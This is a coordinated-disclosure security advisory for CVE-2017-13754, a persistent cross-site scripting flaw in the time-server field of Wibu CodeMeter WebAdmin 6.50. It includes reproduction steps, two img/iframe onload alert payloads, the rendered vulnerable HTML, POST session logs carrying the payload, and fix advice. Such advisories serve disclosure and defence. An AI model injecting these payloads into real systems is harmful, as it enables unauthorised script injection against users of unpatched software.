@@ -1,0 +1,316 @@
+Document Title:
+===============
+Wibu Systems AG CodeMeter 6.50 - Persistent XSS Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2074
+
+ID: FB49498
+
+Acknowledgements: https://www.flickr.com/photos/vulnerabilitylab/36912680045/
+
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-13754
+
+CVE-ID:
+=======
+CVE-2017-13754
+
+
+Release Date:
+=============
+2017-09-04
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2074
+
+
+Common Vulnerability Scoring System:
+====================================
+3.5
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+500€ - 1.000€
+
+
+Product & Service Introduction:
+===============================
+CodeMeter is the universal technology for software publishers and intelligent device manufacturers, upon which all 
+solutions from Wibu-Systems are built. You want to protect the software you have developed against piracy and 
+reverse engineering. CodeMeter requires your attention only once: its integration in your software and your business 
+workflow is necessary at one point in time only. Protection Suite is the tool that automatically encrypts your 
+applications and libraries. In addition, CodeMeter offers an API for custom integration with your software.
+
+(Copy of the Homepage: http://www.wibu.com/us/codemeter.html )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a persistent input validation vulnerability in the official 
+Wibu Systems CodeMeter WebAdmin v6.50 application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2017-05-20: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security GmbH)
+2017-05-21: Vendor Notification (Wibu Systems AG - Security Department)
+2017-05-22: Vendor Response/Feedback (Wibu Systems AG - Security Department)
+2017-08-01: Vendor Fix/Patch (Wibu Systems AG - Service Developer Team)
+2017-08-20: Security Acknowledgements (Wibu Systems AG - Security Department)
+2017-09-04: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Wibu-Systems AG
+Product: CodeMeter & Control Panel - WebAdmin (Web-Application) 6.50.2624.500
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Technical Details & Description:
+================================
+A persistent input validation vulnerability has been discovered in the Wibu Systems AG CodeMeter WebAdmin v6.50 web-server web-application.
+The vulnerability allows remote attackers to inject own malicious script code with application-side vector to the vulnerable function or 
+module to followup with a compromising attack.
+
+The input validation vulnerability has been discovered in the `server name` input field of the `advanced settings - time server` module.
+The request method to inject is POST and the attack vector is located on the application-side. First the attacker injects the payload and 
+after it the POST request is performed to save the content permanently. After that the issue triggers on each visit an execution. The basic 
+validation in the application is well setup but in case of the advanced settings the validation parameter are still not implemented to secure 
+the function at all. The vulnerability is a classic filter input validation vulnerability. The application has no cookies and therefore the 
+attack risk is more minor but not that less then to ignore it. The vulnerable files are `ChangeConfiguration.html`, `time_server_list.html` 
+and `certified_time.html`. The `ChangeConfiguration.html` is marked as injection point for the payload. The `time_server_list.html` and 
+`certified_time.html` files are mared with the execution point of the issue.
+
+The security issue was uncovered during the blurrybox hacking contest of the wibu systems ag and acknowledged by the management.
+
+The security risk of the persistent input validation issue is estimated as medium with a cvss (common vulnerability scoring system) count of 3.5.
+Exploitation of the persistent input validation web vulnerability requires low user interaction and a privileged web-application user account.
+Successful exploitation of the vulnerability results in persistent phishing attacks, persistent external redirects to malicious sources and 
+persistent manipulation of affected or connected application modules.
+
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Advanced Settings - Time Server
+
+Vulnerable File(s):
+[+] ChangeConfiguration.html
+
+Vulnerable Parameter(s):
+[+] server name
+
+Affected Module(s):
+[+] time_server_list.html
+[+] certified_time.html
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation vulnerability can be exploited by remote attackers with privileged user account and with low user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Start the CodeMeter software
+2. Open the webadmin gui
+3. Move to advanced settings
+4. Open the time-server module
+5. Click the plus to add a new time server
+Note: The request method is POST
+6. Inject a test script code payload with matching domain and save via POST
+7. The code is saved and executes of the dbms in the time-server list module index
+8. Successful reproduce of the vulnerability!
+
+Note: The method can be automated by usage of post method requester to include a payload.
+
+
+PoC: Payload (Exploitation)
+cmtime.codehacker.de/>"<img src="evil.source" onload=alert("GUTENMORGEN")>
+cmtime.codehacker.de/>"<iframe src="evil.source" onload=alert("GUTENMORGEN")>
+
+
+
+PoC: Vulnerable Source
+<div id="time_server_to_add"><input id="TimeServerId1" name="time_server_list_list" value="cmtime.codemeter.com" 
+type="radio"><label class="time_server_list_list_label" for="TimeServerId1"><span class="ct100_t bld ssl_number_space">1. 
+</span>cmtime.codemeter.com<span class="ssl_up" onclick="onClickSSLUp(this);" style="visibility: hidden;"><span class="fa 
+fa-arrow-up fa-list-buttons"></span></span><span class="ssl_down" onclick="onClickSSLDown(this);"><span class="fa fa-arrow-down 
+fa-list-buttons"></span></span><span class="ssl_delete" onclick="onClickDelete(this);"><span class="fa fa-trash-o fa-list-buttons">
+</span></span></label><input id="TimeServerId3" name="time_server_list_list" value="cmtime.codemeter.de" type="radio">
+<label class="time_server_list_list_label" for="TimeServerId3"><span class="ct100_t bld ssl_number_space">2. </span>cmtime.codemeter.de
+<span class="ssl_up" onclick="onClickSSLUp(this);"><span class="fa fa-arrow-up fa-list-buttons"></span></span><span class="ssl_down" 
+onclick="onClickSSLDown(this);"><span class="fa fa-arrow-down fa-list-buttons"></span></span><span class="ssl_delete" 
+onclick="onClickDelete(this);"><span class="fa fa-trash-o fa-list-buttons"></span></span></label><input id="TimeServerId4" 
+name="time_server_list_list" value="cmtime.codemeter.us" type="radio"><label class="time_server_list_list_label" for="TimeServerId4">
+<span class="ct100_t bld ssl_number_space">3. </span>cmtime.codemeter.us<span class="ssl_up" onclick="onClickSSLUp(this);">
+<span class="fa fa-arrow-up fa-list-buttons"></span></span><span class="ssl_down" onclick="onClickSSLDown(this);" style="visibility: 
+visible;"><span class="fa fa-arrow-down fa-list-buttons"></span></span><span class="ssl_delete" onclick="onClickDelete(this);">
+<span class="fa fa-trash-o fa-list-buttons"></span></span></label><input id="cmtime.codehacker.de/>" <img="" src="evil.source">" 
+type="radio" name="time_server_list_list" value="cmtime.codehacker.de/>"<img src="evil.source">"/><label class="time_server_list_list_label" 
+for="cmtime.codehacker.de/>" <img="" src="evil.source">"><span id="ssl_number_cmtime.codehacker.de/>" <img="" src="evil.source">"[EXECUTABLE PAYLOAD!]
+class="ct100_t bld ssl_number_space"></span>cmtime.codehacker.de/>"<img src="evil.source"><span class="ssl_up" 
+onclick="onClickSSLUp(this);"><span class="fa fa-arrow-up fa-list-buttons"></span></span><span class="ssl_down" 
+onclick="onClickSSLDown(this);" style="visibility: hidden;"><span class="fa fa-arrow-down fa-list-buttons"></span></span>
+<span class="ssl_delete" onclick="onClickDelete(this);"><span class="fa fa-trash-o fa-list-buttons"></span></span></label></div>
+
+
+--- PoC Session Logs (GET) ---
+Status: 200[OK]
+POST http://localhost:22350/actions/ChangeConfiguration.html 
+Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[1544] 
+Mime Type[text/html]
+   Request Header:
+      Host[localhost:22350]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Content-Type[application/x-www-form-urlencoded]
+      Content-Length[255]
+      Referer[http://localhost:22350/configuration/certified_time.html]
+      Cookie[com.wibu.cm.webadmin.lang=de-DE]
+      Connection[keep-alive]
+      Upgrade-Insecure-Requests[1]
+   POST-Daten:
+      Action[CertifiedTimeConfiguration]
+      TimeServerList[cmtime.codemeter.com%7Ccmtime.codemeter.de%7Ccmtime.codemeter.us%7Ccmtime.codehacker.de/>"<img src="evil.source" onload=alert("GUTENMORGEN")>%7C]
+      SoapTimeOut[20]
+      certified_time_time_out[20]
+      ApplyButton[Apply]
+      WaFormGuard[v0V839tW3xkpa6jC26kYsvZJxe0UFJCl4%2FB2ipA6Xpwv]
+   Response Header:
+      Server[WIBU-SYSTEMS HTTP Server]
+      Date[21 May 2017 16:00:21 +0000]
+      Content-Type[text/html; charset=utf-8]
+      X-Frame-Options[SAMEORIGIN]
+      x-xss-protection[1; mode=block]
+      Accept-Ranges[bytes]
+      Content-Length[1544]
+-
+Status: 200[OK]
+GET http://localhost:22350/configuration/iframe/evil.source[PAYLOAD EXECUTION]
+Load Flags[LOAD_NORMAL] Größe des Inhalts[2320] Mime Type[text/html]
+   Request Header:
+      Host[localhost:22350]
+      User-Agent[zero-zero]
+      Accept[*/*]
+      Referer[http://localhost:22350/configuration/iframe/time_server_list.html]
+      Cookie[com.wibu.cm.webadmin.lang=de-DE]
+      Connection[keep-alive]
+   Response Header:
+      Server[WIBU-SYSTEMS HTTP Server]
+      Date[19 May 2017 21:02:23 +0000]
+      Connection[close]
+      Content-Type[text/html; charset=utf-8]
+      X-Frame-Options[SAMEORIGIN]
+      x-xss-protection[1; mode=block]
+      Accept-Ranges[bytes]
+      Content-Length[2320]
+-
+Status: 200[OK]
+GET http://localhost:22350/configuration/iframe/evil.source 
+Mime Type[text/html]
+   Request Header:
+      Host[localhost:22350]
+      User-Agent[zero-zero]
+      Accept[*/*]
+      Referer[http://localhost:22350/configuration/iframe/time_server_list.html]
+      Cookie[com.wibu.cm.webadmin.lang=de-DE]
+      Connection[keep-alive]
+   Response Header:
+      Server[WIBU-SYSTEMS HTTP Server]
+      Date[19 May 2017 21:06:56 +0000]
+      Connection[close]
+      Content-Type[text/html; charset=utf-8]
+      X-Frame-Options[SAMEORIGIN]
+      x-xss-protection[1; mode=block]
+      X-Content-Type-Options[nosniff]
+      Accept-Ranges[bytes]
+      Content-Length[2320]
+
+
+Reference(s):
+http://localhost:22350/
+http://localhost:22350/configuration/
+http://localhost:22350/configuration/ChangeConfiguration.html
+http://localhost:22350/configuration/certified_time.html
+http://localhost:22350/configuration/time_server_list.html
+
+
+Solution - Fix & Patch:
+=======================
+1. Restrict the input field and disallow the usage of special chars like in the other input fields
+2. Parse the input field and escape the content
+3. Parse in the visible listing the output location of the item
+4. Setup a secure exception-handling to handl illegal events
+5. Include a proper validation mask to the form to prevent further injection attacks
+
+The security vulnerability has been patched in the version 6.50b.
+
+
+Security Risk:
+==============
+The seurity risk of the persistent input validation web vulnerability in the web-server webadmin web-application is estimated as medium (CVSS 3.5).
+Earlier version releases up to codemeter 6.50 may be affected as well by the cross site scripting web vulnerability.
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.)
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
+implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
+case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
+suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
+or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
+websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
+or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
+phone numbers, conversations or anything else to journalists, investigative authorities or private individuals. 
+
+Domains:    www.vulnerability-lab.com		- www.vulnerability-db.com					- www.evolution-sec.com
+Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php
+Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
+Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
+
+Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
+Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
+of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get an ask permission.
+
+				    Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+
+
